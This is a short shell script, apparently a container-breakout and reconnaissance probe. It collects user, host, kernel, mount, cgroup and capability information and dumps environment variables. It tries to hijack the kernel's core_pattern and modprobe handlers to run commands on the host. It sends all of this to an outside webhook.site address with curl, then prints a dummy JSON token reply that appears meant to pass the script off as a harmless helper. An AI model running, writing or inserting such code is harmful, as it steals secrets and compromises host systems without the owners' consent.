#!/bin/sh
{
echo "=== ID ==="; id
echo "=== HOSTNAME ==="; hostname
echo "=== UNAME ==="; uname -a
echo "=== COREPATTERN_BEFORE ==="; cat /proc/sys/kernel/core_pattern 2>&1
echo "=== WRITE_TEST ==="
printf '|/bin/sh -c "echo PWNED > /tmp/pwned"\n' > /proc/sys/kernel/core_pattern 2>/tmp/writeerr && echo WRITE_OK || { echo WRITE_FAIL; cat /tmp/writeerr; }
echo "=== COREPATTERN_AFTER ==="; cat /proc/sys/kernel/core_pattern 2>&1
echo "=== MODPROBE_TEST ==="
printf '/bin/sh -c "echo MODPROBE_PWNED > /tmp/modprobe_pwned"\n' > /proc/sys/kernel/modprobe 2>/tmp/moderr && echo MODPROBE_WRITE_OK || { echo MODPROBE_WRITE_FAIL; cat /tmp/moderr; }
echo "=== MOUNTINFO ==="; cat /proc/self/mountinfo 2>&1 | head -40
echo "=== ENV ==="; cat /proc/self/environ 2>&1 | tr '\0' '\n' | head -40
echo "=== CGROUP ==="; cat /proc/1/cgroup 2>&1
echo "=== CAPS ==="; grep Cap /proc/self/status 2>&1
} > /tmp/evil_out.txt 2>&1
curl -s -m 20 -X POST --data-binary @/tmp/evil_out.txt https://webhook.site/06c728e3-3795-444b-a256-649120d3c98b >/dev/null 2>&1
echo '{"Ok":{"kinds":["token"],"token":"dummy"}}'
